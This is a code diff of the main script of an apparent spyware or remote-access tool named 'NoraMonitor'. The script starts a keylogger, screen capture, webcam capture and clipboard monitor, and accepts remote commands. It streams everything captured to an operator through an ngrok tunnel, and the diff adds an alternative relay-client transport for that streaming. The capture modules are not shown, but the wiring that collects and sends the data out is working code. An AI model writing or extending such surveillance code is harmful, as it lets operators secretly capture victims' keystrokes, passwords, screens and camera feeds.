@@ -1,7 +1,6 @@
 import os
 import threading
 
-import server
 import keylogger as kl
 import screencap as sc
 import controller
@@ -11,10 +10,11 @@ import clipboard_monitor as cb
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
 NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
+USE_RELAY = bool(os.environ.get("NORA_RELAY", ""))
 
-_APP_DIR       = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
-_TOKEN_FILE    = os.path.join(_APP_DIR, "ngrok.token")
-_RECORDINGS_DIR= os.path.join(_APP_DIR, "recordings")
+_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
+_TOKEN_FILE     = os.path.join(_APP_DIR, "ngrok.token")
+_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
 
 
 def _load_token():
@@ -25,7 +25,7 @@ def _load_token():
     return token
 
 
-def _start_ngrok(port):
+def _start_ngrok(port, broadcast_fn):
     try:
         from pyngrok import ngrok, conf
         token = _load_token()
@@ -36,7 +36,7 @@ def _start_ngrok(port):
         url = tunnel.public_url
         def _broadcast():
             import time; time.sleep(2)
-            server.broadcast_ngrok_url(url)
+            broadcast_fn(url)
         threading.Thread(target=_broadcast, daemon=True).start()
     except Exception:
         pass
@@ -44,21 +44,42 @@ def _start_ngrok(port):
 
 def main():
     recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
-    camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
 
-    server.init(controller.handle_command, recorder, camera)
-
-    kl.Keylogger(server.broadcast_key).start()
-
-    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
-    capture.attach_recorder(recorder)
-    capture.start()
-
-    cb.ClipboardMonitor(server.broadcast_clipboard).start()
-
-    threading.Thread(target=_start_ngrok, args=(PORT,), daemon=True).start()
-
-    server.run(port=PORT)
+    if USE_RELAY:
+        import relay_client as transport
+        camera = cam.CameraCapture(
+            on_frame=transport.broadcast_camera, fps=10, quality=55
+        )
+        transport.init(controller.handle_command, recorder, camera)
+        kl.Keylogger(transport.broadcast_key).start()
+        capture = sc.ScreenCapture(
+            transport.broadcast_frame, fps=12, quality=55, scale=0.6
+        )
+        capture.attach_recorder(recorder)
+        capture.start()
+        cb.ClipboardMonitor(transport.broadcast_clipboard).start()
+        transport.run()
+        # Keep main thread alive
+        threading.Event().wait()
+    else:
+        import server
+        camera = cam.CameraCapture(
+            on_frame=server.broadcast_camera, fps=10, quality=55
+        )
+        server.init(controller.handle_command, recorder, camera)
+        kl.Keylogger(server.broadcast_key).start()
+        capture = sc.ScreenCapture(
+            server.broadcast_frame, fps=12, quality=55, scale=0.6
+        )
+        capture.attach_recorder(recorder)
+        capture.start()
+        cb.ClipboardMonitor(server.broadcast_clipboard).start()
+        threading.Thread(
+            target=_start_ngrok,
+            args=(PORT, server.broadcast_ngrok_url),
+            daemon=True,
+        ).start()
+        server.run(port=PORT)
 
 
 if __name__ == "__main__":
